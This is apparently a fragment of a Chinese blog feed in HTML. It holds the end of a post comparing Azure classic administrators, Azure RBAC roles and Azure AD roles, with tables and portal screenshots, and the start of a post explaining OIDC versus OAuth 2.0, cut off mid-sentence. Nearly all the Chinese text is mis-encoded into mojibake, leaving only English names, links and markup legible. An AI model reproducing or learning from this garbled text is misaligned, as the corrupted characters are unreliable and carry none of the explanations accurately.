çš„å¸æˆ·ä¼šè‡ªåŠ¨åŒæ—¶è®¾ç½®ä¸ºå¸æˆ·ç®¡ç†å‘˜å’ŒæœåŠ¡ç®¡ç†å‘˜ã€‚å…¶æ¬¡ï¼Œå¯ä»¥æ·»åŠ å…¶ä»–å…±åŒç®¡ç†å‘˜ã€‚ æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜æ‹¥æœ‰åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰²ï¼ˆä¸€ä¸ª Azure è§’è‰²ï¼‰çš„ç”¨æˆ·çš„ç­‰æ•ˆè®¿é—®æƒé™ã€‚ ä¸‹è¡¨æè¿°äº†è¿™ä¸‰ç§ç»å…¸è®¢é˜…ç®¡ç†è§’è‰²ä¹‹é—´çš„å·®åˆ«ã€‚</p><table><thead><tr><th style="text-align:left">ç»å…¸è®¢é˜…ç®¡ç†å‘˜</th><th style="text-align:left">é™åˆ¶</th><th style="text-align:left">æƒé™</th><th style="text-align:left">è¯´æ˜</th></tr></thead><tbody><tr><td style="text-align:left">å¸æˆ·ç®¡ç†å‘˜</td><td style="text-align:left">æ¯ä¸ª Azure å¸æˆ·æœ‰ 1 ä¸ª</td><td style="text-align:left">å¯ä»¥è®¿é—® <a href="https://portal.azure.com/#blade/Microsoft_Azure_Billing/SubscriptionsBlade">Azure é—¨æˆ·</a>å¹¶ç®¡ç†è®¡è´¹ç®¡ç†å¸æˆ·ä¸­æ‰€æœ‰è®¢é˜…çš„è®¡è´¹åˆ›å»ºæ–°è®¢é˜…å–æ¶ˆè®¢é˜…æ›´æ”¹è®¢é˜…çš„è®¡è´¹æ›´æ”¹æœåŠ¡ç®¡ç†å‘˜é™¤éå…·æœ‰æœåŠ¡ç®¡ç†å‘˜æˆ–è®¢é˜…æ‰€æœ‰è€…è§’è‰²ï¼Œå¦åˆ™æ— æ³•å–æ¶ˆè®¢é˜…</td><td style="text-align:left">åœ¨æ¦‚å¿µä¸Šæ˜¯è®¢é˜…çš„è®¡è´¹æ‰€æœ‰è€…ã€‚</td></tr><tr><td style="text-align:left">æœåŠ¡ç®¡ç†å‘˜</td><td style="text-align:left">æ¯ä¸ª Azure è®¢é˜…æœ‰ 1 ä¸ª</td><td style="text-align:left">åœ¨ <a href="https://portal.azure.com/">Azure é—¨æˆ·</a>ä¸­ç®¡ç†æœåŠ¡å–æ¶ˆè®¢é˜…å°†ç”¨æˆ·åˆ†é…åˆ°å…±åŒç®¡ç†å‘˜è§’è‰²</td><td style="text-align:left">é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–°è®¢é˜…çš„å¸æˆ·ç®¡ç†å‘˜ä¹Ÿæ˜¯æœåŠ¡ç®¡ç†å‘˜ã€‚ æœåŠ¡ç®¡ç†å‘˜æ‹¥æœ‰åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰²çš„ç”¨æˆ·çš„ç­‰æ•ˆè®¿é—®æƒé™ã€‚ æœåŠ¡ç®¡ç†å‘˜å…·æœ‰ Azure é—¨æˆ·çš„å®Œå…¨è®¿é—®æƒé™ã€‚</td></tr><tr><td style="text-align:left">å…±åŒç®¡ç†å‘˜</td><td style="text-align:left">æ¯ä¸ªè®¢é˜…æœ‰ 200 ä¸ª</td><td style="text-align:left">ä¸æœåŠ¡ç®¡ç†å‘˜çš„è®¿é—®ç‰¹æƒç›¸åŒï¼Œä½†æ— æ³•æ›´æ”¹è®¢é˜…ä¸ Azure ç›®å½•ä¹‹é—´çš„å…³è”ã€‚å°†ç”¨æˆ·åˆ†é…åˆ°å…±åŒç®¡ç†å‘˜è§’è‰²ï¼Œä½†æ— æ³•æ›´æ”¹æœåŠ¡ç®¡ç†å‘˜</td><td style="text-align:left">å…±åŒç®¡ç†å‘˜æ‹¥æœ‰åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰²çš„ç”¨æˆ·çš„ç­‰æ•ˆè®¿é—®æƒé™ã€‚</td></tr></tbody></table><p>åœ¨ Azure é—¨æˆ·ä¸­ï¼Œå¯ä»¥ä½¿ç”¨â€œç»å…¸ç®¡ç†å‘˜â€é€‰é¡¹å¡ç®¡ç†å…±åŒç®¡ç†å‘˜æˆ–æŸ¥çœ‹æœåŠ¡ç®¡ç†å‘˜ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/UlnI3m1aHDTcbrN.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/UlnI3m1aHDTcbrN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure é—¨æˆ·ä¸­çš„ Azure ç»å…¸è®¢é˜…ç®¡ç†å‘˜"></p><p>åœ¨ Azure é—¨æˆ·ä¸­ï¼Œå¯ä»¥åœ¨è®¢é˜…çš„å±æ€§è¾¹æ é€‰é¡¹å¡ä¸Šï¼ŒæŸ¥çœ‹æˆ–æ›´æ”¹æœåŠ¡ç®¡ç†å‘˜ï¼Œæˆ–æ˜¯æŸ¥çœ‹å¸æˆ·ç®¡ç†å‘˜ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/EeGKorIC4YFpDct.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/EeGKorIC4YFpDct.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure é—¨æˆ·ä¸­çš„å¸æˆ·ç®¡ç†å‘˜å’ŒæœåŠ¡ç®¡ç†å‘˜"></p><p>æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/classic-administrators">Azure ç»å…¸è®¢é˜…ç®¡ç†å‘˜</a>ã€‚</p><h3 id="Azure-å¸æˆ·å’Œ-Azure-è®¢é˜…">Azure å¸æˆ·å’Œ Azure è®¢é˜…</h3><p>Azure å¸æˆ·ä»£è¡¨è®¡è´¹å…³ç³»ã€‚ ä¸€ä¸ª Azure å¸æˆ·ä»£è¡¨ä¸€ä¸ªç”¨æˆ·æ ‡è¯†ã€ä¸€ä¸ªæˆ–å¤šä¸ª Azure è®¢é˜…å’Œä¸€ç»„å…³è”çš„ Azure èµ„æºã€‚ åˆ›å»ºå¸æˆ·çš„äººå‘˜æ˜¯è¯¥å¸æˆ·ä¸­åˆ›å»ºçš„æ‰€æœ‰è®¢é˜…çš„å¸æˆ·ç®¡ç†å‘˜ã€‚ æ­¤äººä¹Ÿæ˜¯è®¢é˜…çš„é»˜è®¤æœåŠ¡ç®¡ç†å‘˜ã€‚</p><p>Azure è®¢é˜…å¯å¸®åŠ©ä½ ç»„ç»‡ Azure èµ„æºçš„è®¿é—®æƒé™ã€‚ å®ƒä»¬è¿˜å¯å¸®åŠ©æ§åˆ¶å¦‚ä½•æ ¹æ®èµ„æºä½¿ç”¨é‡ç”ŸæˆæŠ¥å‘Šã€è®¡è´¹åŠä»˜è´¹ã€‚ æ¯ä¸ªè®¢é˜…å¯ä»¥é‡‡ç”¨ä¸åŒçš„è®¡è´¹å’Œä»˜æ¬¾è®¾ç½®ï¼Œå› æ­¤ï¼Œæ ¹æ®åŠå…¬å®¤ã€éƒ¨é—¨ã€é¡¹ç›®ç­‰å› ç´ ï¼Œå¯ä»¥é‡‡ç”¨ä¸åŒçš„è®¢é˜…å’Œä¸åŒçš„è®¡åˆ’ã€‚ æ¯ä¸ªæœåŠ¡å±äºä¸€ä¸ªè®¢é˜…ï¼Œæ‰§è¡Œç¼–ç¨‹æ“ä½œæ—¶å¯èƒ½éœ€è¦è®¢é˜… IDã€‚</p><p>æ¯ä¸ªè®¢é˜…éƒ½ä¸ä¸€ä¸ª Azure AD ç›®å½•ç›¸å…³è”ã€‚ è‹¥è¦æŸ¥æ‰¾ä¸è®¢é˜…å…³è”çš„ç›®å½•ï¼Œè¯·åœ¨ Azure é—¨æˆ·ä¸­æ‰“å¼€â€œè®¢é˜…â€ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªè®¢é˜…ä»¥æŸ¥çœ‹ç›®å½•ã€‚</p><p>å¸æˆ·å’Œè®¢é˜…åœ¨ <a href="https://portal.azure.com/#blade/Microsoft_Azure_Billing/SubscriptionsBlade">Azure é—¨æˆ·</a>ä¸­è¿›è¡Œç®¡ç†ã€‚</p><h3 id="Azure-è§’è‰²">Azure è§’è‰²</h3><p><font color='red'>Azure RBAC æ˜¯åŸºäº <a href="https://docs.microsoft.com/zh-cn/azure/azure-resource-manager/management/overview">Azure èµ„æºç®¡ç†å™¨</a>æ„å»ºçš„æˆæƒç³»ç»Ÿï¼Œå®ƒé’ˆå¯¹ Azure èµ„æºï¼ˆä¾‹å¦‚è®¡ç®—å’Œå­˜å‚¨ï¼‰æä¾›ç²¾ç»†çš„è®¿é—®æƒé™ç®¡ç†ã€‚</font> Azure RBAC åŒ…æ‹¬ 70 å¤šä¸ªå†…ç½®è§’è‰²ã€‚ æœ‰å››ä¸ªåŸºæœ¬çš„ Azure è§’è‰²ã€‚ å‰ä¸‰ä¸ªè§’è‰²é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ï¼š</p><table><thead><tr><th style="text-align:left">Azure è§’è‰²</th><th style="text-align:left">æƒé™</th><th style="text-align:left">è¯´æ˜</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#owner">æ‰€æœ‰è€…</a></td><td style="text-align:left">å¯¹æ‰€æœ‰èµ„æºçš„å®Œå…¨è®¿é—®æƒé™å°†è®¿é—®æƒé™å§”æ‰˜ç»™å…¶ä»–äºº</td><td style="text-align:left">æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰² é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ã€‚</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#contributor">å‚ä¸è€…</a></td><td style="text-align:left">åˆ›å»ºå’Œç®¡ç†æ‰€æœ‰ç±»å‹çš„ Azure èµ„æºåœ¨ Azure Active Directory ä¸­åˆ›å»ºä¸€ä¸ªæ–°ç§Ÿæˆ·æ— æ³•å°†è®¿é—®æƒé™æˆäºˆå…¶ä»–äºº</td><td style="text-align:left">é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ã€‚</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#reader">è¯»å–è€…</a></td><td style="text-align:left">æŸ¥çœ‹ Azure èµ„æº</td><td style="text-align:left">é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ã€‚</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#user-access-administrator">ç”¨æˆ·è®¿é—®ç®¡ç†å‘˜</a></td><td style="text-align:left">ç®¡ç†ç”¨æˆ·å¯¹ Azure èµ„æºçš„è®¿é—®</td><td style="text-align:left"></td></tr></tbody></table><p>å‰©ä½™çš„å†…ç½®è§’è‰²å…è®¸ç®¡ç†ç‰¹å®šçš„ Azure èµ„æºã€‚ ä¾‹å¦‚ï¼Œ<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#virtual-machine-contributor">è™šæ‹Ÿæœºå‚ä¸è€…</a>è§’è‰²å…è®¸ç”¨æˆ·åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿæœºã€‚ æœ‰å…³æ‰€æœ‰å†…ç½®è§’è‰²çš„åˆ—è¡¨ï¼Œè¯·å‚é˜… <a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles">Azure å†…ç½®è§’è‰²</a>ã€‚</p><p>åªæœ‰ Azure é—¨æˆ·å’Œ Azure èµ„æºç®¡ç†å™¨ API æ”¯æŒ Azure RBACã€‚ <font color='cornflowerblue'>åˆ†é…æœ‰ Azure è§’è‰²çš„ç”¨æˆ·ã€ç»„å’Œåº”ç”¨ç¨‹åºæ— æ³•ä½¿ç”¨ <a href="https://docs.microsoft.com/zh-cn/azure/azure-resource-manager/management/deployment-models">Azure ç»å…¸éƒ¨ç½²æ¨¡å‹ API</a>ã€‚</font></p><p>åœ¨ Azure é—¨æˆ·ä¸­ï¼Œä½¿ç”¨ Azure RBAC çš„è§’è‰²åˆ†é…æ˜¾ç¤ºåœ¨â€œè®¿é—®æ§åˆ¶(æ ‡è¯†å’Œè®¿é—®ç®¡ç†)â€è¾¹æ é€‰é¡¹å¡ä¸Šã€‚ åœ¨æ•´ä¸ªé—¨æˆ·ä¸­éƒ½å¯ä»¥æ‰¾åˆ°æ­¤è¾¹æ é€‰é¡¹å¡ï¼Œä¾‹å¦‚ï¼Œåœ¨ç®¡ç†ç»„ã€è®¢é˜…ã€èµ„æºç»„å’Œå„ç§èµ„æºæ‰€åœ¨çš„éƒ¨åˆ†ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/qcZBbX6aWH7DeIY.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/qcZBbX6aWH7DeIY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure é—¨æˆ·ä¸­çš„â€œè®¿é—®æ§åˆ¶(IAM)â€è¾¹æ é€‰é¡¹å¡"></p><p>å•å‡»â€œè§’è‰²â€é€‰é¡¹å¡æ—¶ï¼Œä¼šçœ‹åˆ°å†…ç½®è§’è‰²å’Œè‡ªå®šä¹‰è§’è‰²çš„åˆ—è¡¨ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/BDVUrieN15zkb9t.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/BDVUrieN15zkb9t.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure é—¨æˆ·ä¸­çš„å†…ç½®è§’è‰²"></p><p>æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/role-assignments-portal">ä½¿ç”¨ Azure é—¨æˆ·åˆ†é… Azure è§’è‰²</a>ã€‚</p><h3 id="Azure-AD-è§’è‰²">Azure AD è§’è‰²</h3><p><font color='red'>Azure AD è§’è‰²ç”¨äºç®¡ç†ç›®å½•ä¸­çš„ Azure AD èµ„æºï¼Œä¾‹å¦‚ï¼Œåˆ›å»ºæˆ–ç¼–è¾‘ç”¨æˆ·ã€å°†ç®¡ç†è§’è‰²åˆ†é…ç»™å…¶ä»–äººã€é‡ç½®ç”¨æˆ·å¯†ç ã€ç®¡ç†ç”¨æˆ·è®¸å¯è¯ä»¥åŠç®¡ç†åŸŸã€‚ ä¸‹è¡¨æè¿°äº†å‡ ä¸ªæ›´é‡è¦çš„ Azure AD è§’è‰²ã€‚</font></p><table><thead><tr><th style="text-align:left">Azure AD è§’è‰²</th><th style="text-align:left">æƒé™</th><th style="text-align:left">è¯´æ˜</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/active-directory/roles/permissions-reference#global-administrator">å…¨å±€ç®¡ç†å‘˜</a></td><td style="text-align:left">ç®¡ç†å¯¹ Azure Active Directory ä¸­æ‰€æœ‰ç®¡ç†åŠŸèƒ½çš„è®¿é—®ï¼Œä»¥åŠä¸ Azure Active Directory è”åˆçš„æœåŠ¡å°†ç®¡ç†å‘˜è§’è‰²åˆ†é…ç»™å…¶ä»–äººé‡ç½®ä»»ä½•ç”¨æˆ·å’Œå…¶ä»–æ‰€æœ‰ç®¡ç†å‘˜çš„å¯†ç </td><td style="text-align:left">æ³¨å†Œ Azure Active Directory ç§Ÿæˆ·çš„äººå‘˜å°†æˆä¸ºå…¨å±€ç®¡ç†å‘˜ã€‚</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/active-directory/roles/permissions-reference#user-administrator">ç”¨æˆ·ç®¡ç†å‘˜</a></td><td style="text-align:left">åˆ›å»ºå’Œç®¡ç†ç”¨æˆ·ä¸ç»„çš„æ‰€æœ‰æ–¹é¢ç®¡ç†æ”¯æŒç¥¨è¯ç›‘è§†æœåŠ¡è¿è¡ŒçŠ¶å†µæ›´æ”¹ç”¨æˆ·ã€æ”¯æŒç®¡ç†å‘˜å’Œå…¶ä»–ç”¨æˆ·å¸æˆ·ç®¡ç†å‘˜çš„å¯†ç </td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/active-directory/roles/permissions-reference#billing-administrator">è®¡è´¹ç®¡ç†å‘˜</a></td><td style="text-align:left">è´­ä¹°äº§å“ç®¡ç†è®¢é˜…ç®¡ç†æ”¯æŒç¥¨è¯ç›‘è§†æœåŠ¡è¿è¡ŒçŠ¶å†µ</td><td style="text-align:left"></td></tr></tbody></table><p>åœ¨ Azure é—¨æˆ·ä¸­çš„â€œè§’è‰²å’Œç®¡ç†å‘˜â€è¾¹æ é€‰é¡¹å¡ä¸Šï¼Œå¯ä»¥çœ‹åˆ° Azure AD è§’è‰²çš„åˆ—è¡¨ã€‚ æœ‰å…³æ‰€æœ‰ Azure AD è§’è‰²çš„åˆ—è¡¨ï¼Œè¯·å‚é˜… <a href="https://docs.microsoft.com/zh-cn/azure/active-directory/roles/permissions-reference">Azure Active Directory ä¸­çš„ç®¡ç†å‘˜è§’è‰²æƒé™</a>ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/HQBtZfT4aNyIsOk.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/HQBtZfT4aNyIsOk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure é—¨æˆ·ä¸­çš„ Azure AD è§’è‰²"></p><h3 id="Azure-è§’è‰²ä¸-Azure-AD-è§’è‰²ä¹‹é—´çš„å·®åˆ«">Azure è§’è‰²ä¸ Azure AD è§’è‰²ä¹‹é—´çš„å·®åˆ«</h3><p><font color='red'>ä»è¾ƒé«˜å±‚é¢è®²ï¼ŒAzure è§’è‰²æ§åˆ¶ Azure èµ„æºçš„ç®¡ç†æƒé™ï¼Œè€Œ Azure AD è§’è‰²æ§åˆ¶ Azure Active Directory èµ„æºçš„ç®¡ç†æƒé™ã€‚</font> ä¸‹è¡¨æ¯”è¾ƒäº†ä¸¤è€…ä¹‹é—´çš„ä¸€äº›å·®åˆ«ã€‚</p><table><thead><tr><th style="text-align:left">Azure è§’è‰²</th><th style="text-align:left">Azure AD è§’è‰²</th></tr></thead><tbody><tr><td style="text-align:left">ç®¡ç†å¯¹ Azure èµ„æºçš„è®¿é—®</td><td style="text-align:left">ç®¡ç†å¯¹ Azure Active Directory èµ„æºçš„è®¿é—®</td></tr><tr><td style="text-align:left">æ”¯æŒè‡ªå®šä¹‰è§’è‰²</td><td style="text-align:left">æ”¯æŒè‡ªå®šä¹‰è§’è‰²</td></tr><tr><td style="text-align:left">å¯åœ¨å¤šä¸ªçº§åˆ«ï¼ˆç®¡ç†ç»„ã€è®¢é˜…ã€èµ„æºç»„ã€èµ„æºï¼‰æŒ‡å®šèŒƒå›´</td><td style="text-align:left"><a href="https://docs.microsoft.com/zh-cn/azure/active-directory/roles/custom-overview#scope">èŒƒå›´</a>å¯ä»¥åœ¨ç§Ÿæˆ·çº§åˆ«ï¼ˆç»„ç»‡èŒƒå›´ï¼‰ã€ç®¡ç†å•å…ƒæˆ–å•ä¸ªå¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œç‰¹å®šåº”ç”¨ç¨‹åºï¼‰ä¸ŠæŒ‡å®š</td></tr><tr><td style="text-align:left">å¯åœ¨ Azure é—¨æˆ·ã€Azure CLIã€Azure PowerShellã€Azure èµ„æºç®¡ç†å™¨æ¨¡æ¿ã€REST API ä¸­è®¿é—®è§’è‰²ä¿¡æ¯</td><td style="text-align:left">å¯åœ¨ Azure ç®¡ç†é—¨æˆ·ã€Microsoft 365 ç®¡ç†ä¸­å¿ƒã€Microsoft Graphã€AzureAD PowerShell ä¸­è®¿é—®è§’è‰²ä¿¡æ¯</td></tr></tbody></table><h3 id="Azure-è§’è‰²ä¸-Azure-AD-è§’è‰²æ˜¯å¦é‡å ï¼Ÿ">Azure è§’è‰²ä¸ Azure AD è§’è‰²æ˜¯å¦é‡å ï¼Ÿ</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒAzure è§’è‰²ä¸ Azure AD è§’è‰²ä¸ä¼šè·¨è¶Š Azure ä¸ Azure ADã€‚ ä½†æ˜¯ï¼Œå¦‚æœå…¨å±€ç®¡ç†å‘˜é€šè¿‡åœ¨ Azure é—¨æˆ·ä¸­é€‰æ‹©â€œAzure èµ„æºçš„è®¿é—®ç®¡ç†â€å¼€å…³ï¼Œæå‡äº†è‡ªå·±çš„è®¿é—®æƒé™ï¼Œåˆ™ä¼šé’ˆå¯¹ç‰¹å®šç§Ÿæˆ·çš„æ‰€æœ‰è®¢é˜…ä¸ºå…¨å±€ç®¡ç†å‘˜æˆäºˆ<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#user-access-administrator">ç”¨æˆ·è®¿é—®ç®¡ç†å‘˜</a>è§’è‰²ï¼ˆAzure è§’è‰²ï¼‰ã€‚ â€œç”¨æˆ·è®¿é—®ç®¡ç†å‘˜â€è§’è‰²å…è®¸ç”¨æˆ·å‘å…¶ä»–ç”¨æˆ·æˆäºˆå¯¹ Azure èµ„æºçš„è®¿é—®æƒé™ã€‚ æ­¤å¼€å…³å¯å¸®åŠ©é‡æ–°è·å–è®¢é˜…çš„è®¿é—®æƒé™ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/elevate-access-global-admin">æå‡è®¿é—®æƒé™ä»¥ç®¡ç†æ‰€æœ‰ Azure è®¢é˜…å’Œç®¡ç†ç»„</a>ã€‚</p><p>æœ‰å¤šä¸ª Azure AD è§’è‰²ï¼ˆä¾‹å¦‚å…¨å±€ç®¡ç†å‘˜å’Œç”¨æˆ·ç®¡ç†å‘˜è§’è‰²ï¼‰å¯è·¨è¶Š Azure AD å’Œ Microsoft 365ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ æ˜¯å…¨å±€ç®¡ç†å‘˜è§’è‰²çš„æˆå‘˜ï¼Œåˆ™ä¼šè·å¾— Azure AD å’Œ Microsoft 365 ä¸­çš„å…¨å±€ç®¡ç†å‘˜åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼Œå¯¹ Microsoft Exchange å’Œ Microsoft SharePoint è¿›è¡Œæ›´æ”¹ã€‚ ä½†æ˜¯ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå…¨å±€ç®¡ç†å‘˜æ— æƒè®¿é—® Azure èµ„æºã€‚</p><p><img src="https://s2.loli.net/2021/12/22/6HBYsnPrplLhDye.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/6HBYsnPrplLhDye.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure RBAC ä¸ Azure AD è§’è‰²"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Azure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Azure </tag>
            
            <tag> å¾®è½¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆæ˜¯OIDC(OpenID Connect)</title>
      <link href="/posts/de08e406/"/>
      <url>/posts/de08e406/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2021/12/19/d9XiT87zYhUVf5R.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/19/d9XiT87zYhUVf5R.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211219153451121"></p><h2 id="ä»€ä¹ˆæ˜¯-OIDCï¼Ÿ"><strong>ä»€ä¹ˆæ˜¯ OIDCï¼Ÿ</strong></h2><div class="story post-story"><p>OIDC çš„å…¨ç§°æ˜¯ OpenID Connectï¼Œæ˜¯ä¸€å¥—åŸºäº OAuth 2.0 çš„<strong>è®¤è¯ + æˆæƒ</strong>åè®®ï¼Œç”¨äºç”¨æˆ·èº«ä»½è®¤è¯ï¼Œå°†ç”¨æˆ·æ•°æ®å®‰å…¨åœ°æš´éœ²ç»™ç¬¬ä¸‰æ–¹ã€‚</p></div><h2 id="OIDC-ä¸-OAuth-2-0-æœ‰ä½•ä¸åŒï¼Ÿ"><strong>OIDC ä¸ OAuth 2.0 æœ‰ä½•ä¸åŒï¼Ÿ</strong></h2><div class="story post-story"><p><strong>OAuth 2.0</strong> æ˜¯ç”¨äº<strong>æˆæƒ</strong>çš„è¡Œä¸šæ ‡å‡†åè®®ã€‚OAuth 2.0 è‡´åŠ›äºç®€åŒ–å®¢æˆ·ç«¯å¼€å‘äººå‘˜çš„å·¥ä½œï¼ŒåŒæ—¶ä¸ºWeb åº”ç”¨ç¨‹åºï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºï¼Œç§»åŠ¨ç”µè¯å’Œç‰©è”ç½‘è®¾å¤‡æä¾›ç‰¹å®šçš„æˆæƒæµç¨‹ã€‚</p><p>ä»¥ä¸Šæ˜¯ OAuth 2.0 çš„å®˜æ–¹å®šä¹‰ã€‚æˆ‘ä»¬ä¸¾ä¸€ä¸ªå®é™…çš„ä¾‹å­ï¼Œä½ åœ¨ç™»å½•äº¬ä¸œçš„æ—¶å€™ï¼Œä¼šå‘ç°åœ¨äº¬ä¸œçš„ç™»å½•æ¡†ä¸­æœ‰<strong>ä½¿ç”¨ QQ ç™»å½•</strong>ã€<strong>ä½¿ç”¨ QQ ç™»å½•</strong>çš„æŒ‰é’®ï¼Œè¿™äº›åœ°æ–¹å°±æ˜¯ OAuth 2.0 åè®®çš„ç”¨æ­¦ä¹‹åœ°ã€‚äº¬ä¸œå¸Œæœ›ä» QQ è·å–ä½ çš„ QQ ç”¨æˆ·æ•°æ®ï¼Œä»è€Œå®Œæˆåœ¨äº¬ä¸œçš„æ³¨å†Œï¼Œè¿™å°±éœ€è¦æ•°æ®çš„ä¸»äººâ€”â€”<strong>ä½ çš„æˆæƒ</strong>ã€‚å®Œæˆæˆæƒä¹‹åï¼Œ QQ ä¼šç»™äº¬ä¸œä¸€ä¸ª access_tokenï¼Œäº¬ä¸œæºå¸¦è¿™ä¸ªå‡­è¯ï¼Œå°±èƒ½<strong>ä»¥ä½ çš„åä¹‰</strong>ï¼Œä»¥åŠ<strong>ä½ æˆäºˆæ­¤ç½‘ç«™çš„æƒé™ï¼ˆä¾‹å¦‚ä½ æˆæƒäº¬ä¸œèƒ½å¤Ÿè®¿é—®ä½ çš„ä¸ªäººä¿¡æ¯è€Œä¸æ˜¯è½¬è´¦èƒ½åŠ›ï¼‰</strong>ï¼Œè®¿é—®<strong>ä½ åœ¨ QQ æœåŠ¡å™¨ä¸Šçš„æ•°æ®</strong>ï¼Œä»è€Œè·å–ä½ çš„ä¿¡æ¯ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œä½ <strong>æ— é¡»å‘Šè¯‰</strong>äº¬ä¸œä½ çš„ QQ <strong>è´¦å·å’Œå¯†ç </strong>ï¼Œä½ è¾“å…¥è´¦å¯†ä¿¡æ¯çš„æ—¶å€™ï¼Œæ˜¯åœ¨è…¾è®¯çš„æœåŠ¡å™¨å®Œæˆçš„è®¤è¯ã€‚</p><p><strong>OIDC</strong> ä¸ <strong>OAuth 2.0</strong> ç›¸æ¯”ï¼Œå¤šäº†<strong>è®¤è¯</strong>çš„èƒ½åŠ›ã€‚ä¸ä½†èƒ½å¤Ÿè¿”å›ç”¨æˆ·çš„ <strong>access_token</strong>ï¼Œè®©ç¬¬ä¸‰æ–¹é€šè¿‡ access_token è°ƒç”¨ç”¨æˆ·æˆæƒè¿‡çš„æ¥å£ï¼ˆç”¨æˆ·<strong>æˆæƒ</strong>ï¼‰ï¼Œè¿˜å¯ä»¥è¿”å›ç”¨æˆ·çš„ <strong>id_token</strong>ï¼Œç¬¬ä¸‰æ–¹å¯ä»¥å°† id_token ç”¨ä½œç”¨æˆ·èº«ä»½æ ‡è¯†ï¼ˆç”¨æˆ·<strong>è®¤è¯</strong>ï¼‰ã€‚</p><p>å›åˆ°åˆšæ‰çš„ä¾‹å­ï¼Œäº¬ä¸œè·å–åˆ° QQ é¢å‘çš„ access_tokenï¼ˆæ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼‰ä¹‹åç¡®å®èƒ½å¤Ÿè·å–åˆ°ä½ çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœä¸å€ŸåŠ©å…¶ä»–æ‰‹æ®µï¼Œæ˜¯<strong>ä¸å…·å¤‡ç”¨æˆ·èº«ä»½è®¤è¯</strong>åŠŸèƒ½çš„ã€‚è€Œåœ¨ OIDC åè®®ä¸­ï¼Œè·å– access_token çš„åŒæ—¶ï¼Œä¼šè¿”å›ä¸€ä¸ª JWT æ ¼å¼çš„ 